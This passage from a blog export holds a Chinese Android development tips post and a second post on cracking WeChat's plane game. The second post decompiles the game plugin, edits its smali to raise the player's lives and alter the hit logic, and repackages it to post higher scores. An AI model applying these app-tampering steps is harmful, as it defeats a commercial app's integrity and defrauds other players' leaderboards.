class=\"annotation\">@Override</span></div><div class=\"line\">publicboolean shouldOverrideUrlLoading(WebView view, String url) {<span class=\"comment\">// 如果是自定义事件</span></div><div class=\"line\"><span class=\"keyword\">if</span> (url.startsWith(&quot;http:<span class=\"comment\">//msg_&quot;)) {</span></div><div class=\"line\"><span class=\"comment\">// 自定义事件处理}return super.shouldOverrideUrlLoading(view, url);</span></div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>其实只要重写shouldOverrideUrlLoading方法不做任何处理就能够在你的web view里面访问新的链接，这里面的url是每次访问的任何一个自由的url地址。由于自身项目原因我这里需要自定义事件，其实就是根据url地址栏的变化自定义自己的消息。这里需要注意的是之前用过python写webkit自定义时间开头用的都是”event://“来自定义时间，但是如果是服务器返回event://来触发时间那么你的愿望将要落空，因为event://服务器是不认的web服务器是泡在http协议上的所以event://是不会返回给客户端的。了解了这个原理，现在的那些神马基于webkit的GUI用html写跨平台APP还有那么神秘吗？</p>\n<p>9. android模拟器中如何访问本机的web服务器？</p>\n<p>由于需要和服务器进行通信并进行数据交互，但是在模拟器中肯定不能通过127.0.0.1来进行访问了，其实有两种方法<br>第一种，直接访问本机内网IP地址就行<br>第二种， 10.0.2.2 是保留地址，供android模拟器访问本地网络<br>10. 按home见后退出activity并重新加载了？ 有时候我们切换应用的适合难免按到home不过如果不做任何设置，从新进来的activity是重新启动吃的初始的activity。<br>解决方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">androidmanifest中的actvity中加入一个参数android:launchMode=&quot;singleTask&quot;</div></pre></td></tr></table></figure>\n\n<p>11. 在一个非aictivy中如何启动一另外一个activity，并且实现回调？<br>当时这个问题真把自己难倒了，启动一个activity其实只要有context基本就可以，但是还要实现回调，因为是通过一个非activity来启动另外一个activity所以就不能用到常规的方法了。其实解决方法还是比价简单，只是当时自己没有想到。</p>\n<p>解决方法就是定义一个单例，把回调方法塞到她里面去，单例在整个运行过程中始终保持单例，所以可以通过单例进行跳转一次来实现回调。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">CallbackListenner</span> </span>{</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onSuccess</span>(Bundle bundle);</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onError</span>(Bundle bundle);</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">class signalClass {</div><div class=\"line\"><span class=\"comment\">//回调接口</span></div><div class=\"line\"><span class=\"keyword\">private</span> CallbackListener;</div><div class=\"line\"><span class=\"comment\">//获取单例</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"title\">getInstance</span>(){</div><div class=\"line\"><span class=\"comment\">// …..</span></div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">publicvoid startLoginDialog(CallbackListenner callback) {</div><div class=\"line\">    CallbackListener = callback;</div><div class=\"line\">\tIntent intent = <span class=\"keyword\">new</span> Intent(_context,JoyCenterActivity.class); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); _context.startActivity(intent);</div><div class=\"line\">\t}</div><div class=\"line\"></div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>在A的activity里面用startLoginDialog启动另外一个activity就可以了。只要在B的activity里面执行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">signalClass.getInstance().CallbackListener.onsuccess(bundle);</div></pre></td></tr></table></figure>\n\n<p>就可以实现回调了<br>12. android 中jqueryMobile page切换和dialog弹出时候抖屏或者白屏问题<br>加入下面代码即可：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$(document).bind(&quot;mobileinit&quot;, function(){</div><div class=\"line\">\t<span class=\"keyword\">if</span> (navigator.userAgent.indexOf(&quot;Android&quot;) != -<span class=\"number\">1</span>){</div><div class=\"line\">\t\t$.mobile.defaultPageTransition = <span class=\"string\">'none'</span>;</div><div class=\"line\">\t\t$.mobile.defaultDialogTransition = <span class=\"string\">'none'</span>;</div><div class=\"line\">\t}</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p>但这里需要注意的一点是，加入这段代码要在引入jqueryMobile之前，作用很明显了，就是绑定属性去掉过渡效果</p>\n","source":"_posts/android最近问题总结.md","raw":"title: \"android最近问题总结 \"\nid: 296\ndate: 2013-07-25 14:27:53\ntags: \n- android\ncategories: \n- 原创作品\n- 技术文章\n---\n\n1\\. 主线线程中更新UI\n由于android的限制，不允许在主线程中对UI进行修改操作，必须要再新线程中。其实这点和lpython 的pyGtk很相似，估计都同为linux的产物。\n自己更新UI的方式：\n\n```java\n//先声明一个Handler，用来接收消息\nprivate Handler messageHandler;\n//消息标识\nprivate finalist UPDATE_UI = 1;\n\nmessageHandler = new Handler() {\n@Override\npublic void handleMessage(Message msg) {\n    if (msg.what == UPDATE_UI) {\n        updateUI(); //更新UI的方法\n    }\n}\n\n```\n<!--more-->\n\n其中updateUI()方法中写自己需要更新的方法就行\n那么如何触发？ 当然是发送消息了~\n在需要更新的操作地方直接发送消息给handler就可以更新UI操作了\n\n```java\nmessageHandler.sendEmptyMessageDelayed(UPDATE_UI, 1000);\n```\n\n2.有时候在2.3的系统上测试正常的代码发放到4.0的系统上直接报网络错误，其实从3.0开始android是不允许在主线程中直接进行耗时操作如网络访问，所以还是需要在线程中进行网络操作。\n自己用到的方式：\n\n```java\n//先声明一个Runnable，然后实现它的Run（）接口,在Runnable里面写自己的业务逻辑，如网络访问\nRunnable loginRunnable = new Runnable() {\n@Override\npublic void run() {\n//这里书写业务逻辑\n}};\n//启动个新线程执行Runnable\n\nnew Thread(loginRunnable).start();\n其实自己用的最多的还是定义相关操作类，继承Runnable并且实现它的run接口\n还有一个Runable错误具体忘记了，不过在run开始前和结束前加上这两个方法就OK\n//开始前\nLooper.prepare();\n//结束前\nLooper.loop();\n```\n\n3.json操作，android自带json处理方法，自己用的最多的是解析字符串json为对象。具体处理方法如下：\n\n```java\nString jsonStr = &quot;{status:1, username:'creturn'}&quot;;\n//定义一个JSONToken加载json字符串\nJSONTokener jsonTokener = new JSONTokener(jsonStr);\n\n//定义json对象，从TOkenr中取得json\nJSONObject jsonObject = null;\n\n//使用此方法可取得json对象\njsonObject = (JSONObject) jsonTokener.nextValue();\n例如要获取username可以这样获取\njsonObject.getString(&quot;username&quot;)\n\n```\n\n4.android里面读取assets目录下的文件\n在activity里面或者能够访问到context的地方都行，最终用到里面的一个方法是：\ngetResources()\n\n它会返回一个资源访问类，在里面有诸多访问资源的方法，我们用到的是里面的\ngetAssets()\n\n用词方法里面会返回一个assetsManger类，通过assetsManger类里面的open方法就可以访问并返回一个InputStream\n这样就可以对输入流进行操作了。具体代码如下：\n\n```java\nInputStream is = _conContext.getResources().getAssets().open(LOGIN_VIEW_BACKGROUND);\n```\n\n其中—conContext是context类如果在activity里面就可以直接使用getResources方法\n5.androi里面的layout纯代码操作，由于最近有一个项目比较特殊，需要打包成Jar给别人使用，但是又不能把过多的内容暴露在外面，\n所以传统的在xml布局文件中得方法不得不放弃，采用纯代码写布局。\nlayout的操作，例如设置其参数默认layout里面没有的方法，那么就需要用到相应的layoutParms类来实现，例如给一个layout设置布局为宽度大小根据内容而定，高度一样根据内容来自适应那么代码就如下（以linnerlayout为例）：\n\n```java\n//定义linearlayoutParms参数\nLinearLayout.LayoutParams layout_params = new LinearLayout.LayoutParams(\nLinearLayout.LayoutParams.WRAP_CONTENT,\n\nLinearLayout.LayoutParams.WRAP_CONTENT);\n//如果需要LinearLayout居中显示可以设置其gravity\nlayout_params.gravity = Gravity.CENTER|Gravity.CENTER_HORIZONTAL|Gravity.CENTER_VERTICAL;\n\n//设置参数\nLinearLayout.setLayoutParams(layout_params);\n```\n\n6.纯代码绘制view的背景，并用指定图片进行平铺操作\n首先用指定代码进行平铺那么就需要读取图片资源，就可以用到上面介绍的方法读取一个inputstream\n\n```java\nInputStream is = _conContext.getResources().getAssets().open(&quot;图片地址&quot;);\n```\n\n注意这里的图片是放在assets目录下面\n由于所有的view最终不管你是用什么方式修改其背景，最终都会转换成drawble进行绘制，所以吧inputstream转换成一个drawable就行，代码如下：\n\n```java\n//从inputstream里面生成BitMapDrawable\nBitmapDrawable bitmapDrawable = (BitmapDrawable) BitmapDrawable.createFromStream(is, null);\n//这里设置其位纵横repeat也就是平铺\nbitmapDrawable.setTileModeXY(TileMode.REPEAT, TileMode.REPEAT);\n//设置背景\n\nsetBackgroundDrawable((Drawable) bitmapDrawable);\n```\n\n7\\.  EditView编辑框中怎么定义其只允许输入指定的内容 ？ 其实如果是xml布局的话很简单，只要设置它的一个参数digits参数就行\n但是悲剧的我只能用代码，那么怎么处理，其实不管是任何一个平台或者相应的和GUI有关的开发，第一个应该想到的就是它的事件，肯定有有关change的事件。在事件发生的适合判断输入的内容是否在允许范围内就行。代码如下：\n\n```java\ntxt_username.addTextChangedListener(new TextWatcher() {\nString tmp = &quot;&quot;; //只允许输入的字符\nString digits = &quot;@._0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLIMNOPQRSTUVWXYZ&quot;;\n@Override\npublic void onTextChanged(CharSequence s, int start, int before, int count) {\n}\n@Override\npublic void beforeTextChanged(CharSequence s, int start, int count,int after) {\n}\n@Override\npublic void afterTextChanged(Editable s) {\nString str = s.toString();\nif(str.equals(tmp)){\nreturn;\n}\nStringBuffer sb = new StringBuffer();\nfor(int i = 0; i &amp;lt; str.length(); i++){\nif(digits.indexOf(str.charAt(i)) &amp;gt;= 0){\nsb.append(str.charAt(i));\n}\n}\ntmp = sb.toString();\ntxt_username.setText(tmp);\ntxt_username.requestFocus();\ntxt_username.setSelection(tmp.length());\n}\n\n});\n\n```\n\n8\\. WebView 在制作sdk过程中其中一个过程需要用到webview，这个webview就是用来访问http。但是使用过程中也碰到一些问题，比如在实例化一个WebView的时候，通常根据他它的参数提示，创建的时候就直接传递Context就行，但是，如果用这样创建的webview来访问http的页面，当再次点击里面的链接的时候就直接报错，所以解决方法就行hi生成webview的时候把当前activiy传递进去，大妈如下：\n\n```java\nWebView webView = new WebView(this);\n```\n\n但是新的问题由来了，虽然不报错了可是所有打开的链接都是通过默认浏览器来执行了，这个显然不是我要的结果，解决方法就是设置一个WebViewClient进行相应的方法重写来实现，代码如下：\n\n```java\n//获取webview的setting\nWebSettings webset = webView.getSettings();\n//启用javascript的支持，不然js就不起作用了\nwebset.setJavaScriptEnabled(true);// 添加web view client ,监听里面的事件webView.setWebViewClient(new WebViewClient() {\n@Override\npublicboolean shouldOverrideUrlLoading(WebView view, String url) {// 如果是自定义事件\nif (url.startsWith(&quot;http://msg_&quot;)) {\n// 自定义事件处理}return super.shouldOverrideUrlLoading(view, url);\n}\n\n}\n```\n\n其实只要重写shouldOverrideUrlLoading方法不做任何处理就能够在你的web view里面访问新的链接，这里面的url是每次访问的任何一个自由的url地址。由于自身项目原因我这里需要自定义事件，其实就是根据url地址栏的变化自定义自己的消息。这里需要注意的是之前用过python写webkit自定义时间开头用的都是\"event://\"来自定义时间，但是如果是服务器返回event://来触发时间那么你的愿望将要落空，因为event://服务器是不认的web服务器是泡在http协议上的所以event://是不会返回给客户端的。了解了这个原理，现在的那些神马基于webkit的GUI用html写跨平台APP还有那么神秘吗？\n\n9\\. android模拟器中如何访问本机的web服务器？\n\n由于需要和服务器进行通信并进行数据交互，但是在模拟器中肯定不能通过127.0.0.1来进行访问了，其实有两种方法\n第一种，直接访问本机内网IP地址就行\n第二种， 10.0.2.2 是保留地址，供android模拟器访问本地网络\n10\\. 按home见后退出activity并重新加载了？ 有时候我们切换应用的适合难免按到home不过如果不做任何设置，从新进来的activity是重新启动吃的初始的activity。\n解决方法：\n\n```java\nandroidmanifest中的actvity中加入一个参数android:launchMode=&quot;singleTask&quot;\n```\n\n11\\. 在一个非aictivy中如何启动一另外一个activity，并且实现回调？\n当时这个问题真把自己难倒了，启动一个activity其实只要有context基本就可以，但是还要实现回调，因为是通过一个非activity来启动另外一个activity所以就不能用到常规的方法了。其实解决方法还是比价简单，只是当时自己没有想到。\n\n解决方法就是定义一个单例，把回调方法塞到她里面去，单例在整个运行过程中始终保持单例，所以可以通过单例进行跳转一次来实现回调。代码如下：\n\n```java\npublic interface CallbackListenner {\n\npublic void onSuccess(Bundle bundle);\npublic void onError(Bundle bundle);\n\n}\n\nclass signalClass {\n//回调接口\nprivate CallbackListener;\n//获取单例\npublic getInstance(){\n// …..\n}\n\npublicvoid startLoginDialog(CallbackListenner callback) {\n    CallbackListener = callback;\n\tIntent intent = new Intent(_context,JoyCenterActivity.class); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); _context.startActivity(intent);\n\t}\n\n}\n```\n\n在A的activity里面用startLoginDialog启动另外一个activity就可以了。只要在B的activity里面执行\n\n```java\nsignalClass.getInstance().CallbackListener.onsuccess(bundle);\n```\n\n就可以实现回调了\n12\\. android 中jqueryMobile page切换和dialog弹出时候抖屏或者白屏问题\n加入下面代码即可：\n\n```java\n$(document).bind(&quot;mobileinit&quot;, function(){\n\tif (navigator.userAgent.indexOf(&quot;Android&quot;) != -1){\n\t\t$.mobile.defaultPageTransition = 'none';\n\t\t$.mobile.defaultDialogTransition = 'none';\n\t}\n});\n\n```\n\n但这里需要注意的一点是，加入这段代码要在引入jqueryMobile之前，作用很明显了，就是绑定属性去掉过渡效果\n","slug":"android最近问题总结","updated":1421659126000,"excerpt":"<p>1. 主线线程中更新UI<br>由于android的限制，不允许在主线程中对UI进行修改操作，必须要再新线程中。其实这点和lpython 的pyGtk很相似，估计都同为linux的产物。<br>自己更新UI的方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//先声明一个Handler，用来接收消息</span></div><div class=\"line\"><span class=\"keyword\">private</span> Handler messageHandler;</div><div class=\"line\"><span class=\"comment\">//消息标识</span></div><div class=\"line\"><span class=\"keyword\">private</span> finalist UPDATE_UI = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\">messageHandler = <span class=\"keyword\">new</span> Handler() {</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleMessage</span>(Message msg) {</div><div class=\"line\">    <span class=\"keyword\">if</span> (msg.what == UPDATE_UI) {</div><div class=\"line\">        updateUI(); <span class=\"comment\">//更新UI的方法</span></div><div class=\"line\">    }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n","_id":"tabbnxi32od2dra1","comments":true,"layout":"post","photos":[],"link":""},{"title":"android版微信打飞机无敌补丁分析及其制作方法","id":303,"date":1376377543000,"tags":["2p7ln21w7mspwye0","fa8uqsv4tw7xctcn","og3yhqb9k72g5laf"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>最近微信5.0版本发布后增加了游戏中心，并且自带一款打飞机游戏,ios版本刚发布1天就被crack掉,并且除了一个无敌补丁，奈何手里没ios设备也没法测试.自己玩了下，感觉游戏真没多少技术含量，不过微信的优势很明显，集成了好友数据,所以结果就是最近天天听到那些家伙喊着”打飞机” ~。~</p>\n<p>不过对于游戏一点都不感冒的我看到好友那么高的分数再对比下自己，额真有点那个啥。所以对于技术控来说去拼命玩那个玩意就有点浪费生命了，所以本着hack for fun 的思想就试试看看能crack掉不.</p>\n<p>首先分析下游戏</p>\n<p>游戏对象：</p>\n<p>飞机，子弹，炸弹，敌机<br>实现方法就有多种成为无敌的方法:</p>\n<p>1.让飞机无敌，也就是不死</p>\n<p>2.让子弹威力变大，并且不消失,这样一个子弹就可以打多个敌机</p>\n<p>3.给自己添加”大量”炸弹,这样也就无敌了</p>\n<p>4.让敌机碰到自己无效,这样就相当于隐形模式了,同样无敌了</p>\n<p>5.给自己多加几条名，这样既可以达到无敌的方式又可以死掉（方便提交分数）不然死都死不掉。</p>\n<a id=\"more\"></a>\n\n<p>代码分析:</p>\n<p>刚开始看到这个游戏以为用的是html5+js写的,不过解包后看到里面的东西就傻眼了，不过依然有方法.</p>\n<p>1.下载 5.0 android的版本的微信,修改后缀名为zip然后解压,如图:</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901926167.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901926167.png\" alt=\"201381901926167\"></a></p>\n<p>2.在解压的目录中找到assset目录然后打开里面的preload目录，如图:</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901927891.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901927891.png\" alt=\"201381901927891\"></a></p>\n<p>可以看到这个目录放了一些jar包，猜测微信采用插件机制来实现功能模块的扩展,其中以”com.tencent.mm.plugin.shoot”开头的jar包，从名字中可以猜测到它就是我们的目标</p>\n<p>这里要说后面需要用到的两款软件:</p>\n<p>1.apktool :用来把apk或者jar包反编译成android的java虚拟机的机器码,方便修改代码逻辑</p>\n<p>下载地址: <a href=\"https://code.google.com/p/android-apktool/\" target=\"_blank\" rel=\"external\">https://code.google.com/p/android-apktool/</a></p>\n<p>2.dex2jar :用来把dex文件反编译jar</p>\n<p>下载地址: <a href=\"http://pan.baidu.com/share/link?shareid=2401317361&amp;uk=2317334154\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/share/link?shareid=2401317361&amp;uk=2317334154</a></p>\n<p>3.auto-sign: 用来对apk进行签名的</p>\n<p>下载地址: <a href=\"http://pan.baidu.com/share/link?shareid=2387101337&amp;uk=2317334154\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/share/link?shareid=2387101337&amp;uk=2317334154</a></p>\n<p>4.jd-gui: 用来查看编译过的class java代码</p>\n<p>下载地址: <a href=\"http://java.decompiler.free.fr/?q=jdgui\" target=\"_blank\" rel=\"external\">http://java.decompiler.free.fr/?q=jdgui</a></p>\n<p>工具齐全后就开始对代码动刀</p>\n<p>用dex2jar把com.tencent.mm.plugin.shoot开头的那个文件处理下,会得到以dex2jar.jar结尾的文件用jd-gui打开这个文件，我们就能看到编译出来的文件，不过腾讯的同学对代码进行了混淆处理所以里面有很多a,b,c,d,e这样的文件,不过很不幸的是腾讯的家伙估计太粗心了，把游戏对象和功能代码没做混淆，混淆的反而是gdx游戏框架的代码,如图:</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901929371.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901929371.png\" alt=\"201381901929371\"></a></p>\n<p>在actor这个包里面明显能看出来各个类的作用，不知道腾讯的同学是妹子想多了还是不给发奖金了，核心部分不做混淆处理…</p>\n<p>上面分析的时候说过无敌模式的几种方式，我这里采用最后一种给自己多加几条命这样也能死掉~~  不然分数都提交不了就没有意义了，看看Player类中的构造函数（或者叫做初始化函数也行）：</p>\n<p>[java]<br>&lt;pre&gt;public Player()<br> {<br> setLiftCount(1);<br> setType(GameSprite.Type.HERO);<br> setState(GameSprite.State.FLIGTHING);<br> setSpeedVelocity(new ag(0.0F, 0.0F));<br> getBounds().height = HEIGHT;<br> getBounds().width = WIDTH;<br> this.mShootDelay = (4.0F * h.Ml().MC().Mi().cEP);<br> this.mShootDoubleTime = h.Ml().MC().Mi().cEQ;<br> }&lt;/pre&gt;<br>[/java]</p>\n<p>明显能够看出来setLiftCount() 这个方法是用来初始化生命值的，如果把这里改大点，不就实现了我们的多条命了。</p>\n<p>用apktool工具对 com.tencent.mm.plugin.shoot开头的这个包进行反编译，命令如下：</p>\n<p>[shell]<br>&lt;pre&gt;apktool d 文件名&lt;/pre&gt;<br>[/shell]</p>\n<p>后面的d参数是反编译，如果换成b就是再次编译回去。</p>\n<p>解包后文件如下图所示：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901932654.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901932654.png\" alt=\"201381901932654\"></a></p>\n<p>其中smali目录就是反编译后的代码，里面的文件以 smali结尾，文件位置和包位置保持一致如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901933428.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901933428.png\" alt=\"201381901933428\"></a></p>\n<p>用任意一款文本编辑器打开Player.smali文件，我们可以看到里面的代码，如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/201381901935312.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/201381901935312.png\" alt=\"201381901935312\"></a></p>\n<p>仔细看有点像汇编，不过它却不是网上可以找到smali语法帮助，我们在这个文件中找到初始化方法，constructor &lt;init&gt;()看着是不是很眼熟：</p>\n<p>[java]<br>&lt;pre&gt;.method public constructor &lt;init&gt;()V<br> .locals 2</p>\n<p>.prologue<br> const/4 v1, 0x0</p>\n<p>.line 46<br> invoke-direct {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;&lt;init&gt;()V</p>\n<p>.line 32<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;-&gt;NORMAL:Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;</p>\n<p>iput-object v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mBulleType:Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;</p>\n<p>.line 47<br> const/4 v0, 0x1</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V</p>\n<p>.line 48<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setType(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;)V</p>\n<p>.line 49<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;FLIGTHING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V</p>\n<p>.line 50<br> new-instance v0, Lcom/badlogic/gdx/math/ag;</p>\n<p>invoke-direct {v0, v1, v1}, Lcom/badlogic/gdx/math/ag;-&gt;&lt;init&gt;(FF)V</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setSpeedVelocity(Lcom/badlogic/gdx/math/ag;)V</p>\n<p>.line 52<br> invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;getBounds()Lcom/badlogic/gdx/math/af;</p>\n<p>move-result-object v0</p>\n<p>sget v1, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;HEIGHT:F</p>\n<p>iput v1, v0, Lcom/badlogic/gdx/math/af;-&gt;height:F</p>\n<p>.line 53<br> invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;getBounds()Lcom/badlogic/gdx/math/af;</p>\n<p>move-result-object v0</p>\n<p>sget v1, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;WIDTH:F</p>\n<p>iput v1, v0, Lcom/badlogic/gdx/math/af;-&gt;width:F</p>\n<p>.line 55<br> invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;</p>\n<p>move-result-object v0</p>\n<p>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MC()Lcom/tencent/mm/plugin/shoot/a/d;</p>\n<p>move-result-object v0</p>\n<p>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/d;-&gt;Mi()Lcom/tencent/mm/plugin/shoot/a/b;</p>\n<p>move-result-object v0</p>\n<p>iget v0, v0, Lcom/tencent/mm/plugin/shoot/a/b;-&gt;cEP:F</p>\n<p>const/high16 v1, 0x4080</p>\n<p>mul-float/2addr v0, v1</p>\n<p>iput v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mShootDelay:F</p>\n<p>.line 59<br> invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;</p>\n<p>move-result-object v0</p>\n<p>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MC()Lcom/tencent/mm/plugin/shoot/a/d;</p>\n<p>move-result-object v0</p>\n<p>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/d;-&gt;Mi()Lcom/tencent/mm/plugin/shoot/a/b;</p>\n<p>move-result-object v0</p>\n<p>iget v0, v0, Lcom/tencent/mm/plugin/shoot/a/b;-&gt;cEQ:I</p>\n<p>int-to-long v0, v0</p>\n<p>iput-wide v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mShootDoubleTime:J</p>\n<p>.line 60<br> return-void<br>.end method&lt;/pre&gt;<br>[/java]</p>\n<p>根据smali语法修改如下代码：</p>\n<p>[java]<br>&lt;pre&gt;.line 47<br>const/4 v0, 0x1</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V<br>[/java]</p>\n<p>改为:</p>\n<p>[java]<br>&lt;pre&gt;.line 47<br>const/4 v0, 0x7  # 注意这里修改成7</p>\n<p>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V&lt;/pre&gt;<br>[/java]</p>\n<p>修改的地方把默认的1改成了7，也就是说有7条命了。不过别高兴太早，如果这样改了，是没有效果的。因为程序中判断飞机不在战斗状态时候</p>\n<div></div><br><div>是不显示的，所以还需要修改一处代码，先看看原来的java代码GameSprite.smali：</div><br><div> [java]&lt;/div&gt;<br>&lt;div&gt;<br>&lt;pre&gt;public void hit(boolean paramBoolean)<br> {<br>this.liftCount = (-1 + this.liftCount);<br>if (this.liftCount &lt;= 0)<br>{<br>if (paramBoolean)<br>{<br>setState(GameSprite.State.DEAD);<br>setSpeedVelocity(this.speedZero);<br>return;<br>}<br>if ((getType() == GameSprite.Type.ENEMY_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_LARGE_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_MIDDLE) || (getType() == GameSprite.Type.PROPS_BOMB) || (getType() == GameSprite.Type.PROPS_DOUBLE))<br>h.Ml().MD().c(getType());<br>while (true)<br>{<br>setState(GameSprite.State.EXPLODING);<br>break;<br>if (getType() == GameSprite.Type.HERO)<br>h.Ml().MD().MT();<br>}<br>}<br>setState(GameSprite.State.HITING);<br> }<br>[/java]<br><br>这段代码是所有游戏对象基类里面的碰撞处理代码，当生命值小于1 就移除该对象，如果生命值大于1则更改属性为HITING ,不过飞机如果遇到这<br><div></div><br><div>个状态肯定不行的，撞机了还能继续飞？所以这里需要判断下如果是飞机，那么就要修改它的状态为：FLIGTHING</div><br><div></div><br><div>所以如果按照java代码修改的代码会和下面的代码一样：</div><br><div>[java]&lt;/div&gt;<br>&lt;div&gt;<br>&lt;div&gt;<br>&lt;pre&gt;public void hit(boolean paramBoolean)<br>{<br>this.liftCount = (-1 + this.liftCount);<br>if (this.liftCount &lt;= 0)<br>{<br>if (paramBoolean)<br>{<br>setState(GameSprite.State.DEAD);<br>setSpeedVelocity(this.speedZero);<br>return;<br>}<br>if ((getType() == GameSprite.Type.ENEMY_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_LARGE_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_MIDDLE) || (getType() == GameSprite.Type.PROPS_BOMB) || (getType() == GameSprite.Type.PROPS_DOUBLE))<br>h.Ml().MD().c(getType());<br>while (true)<br>{<br>setState(GameSprite.State.EXPLODING);<br>break;<br>if (getType() == GameSprite.Type.HERO)<br>h.Ml().MD().MT();<br>}<br>}<br><br>//在这里添加我们的代码<br><br>if(getType==GameSprite.Type.HERO)<br><br>{<br><br>setState(GameSprite.State.FLIGTHING);<br><br>} else 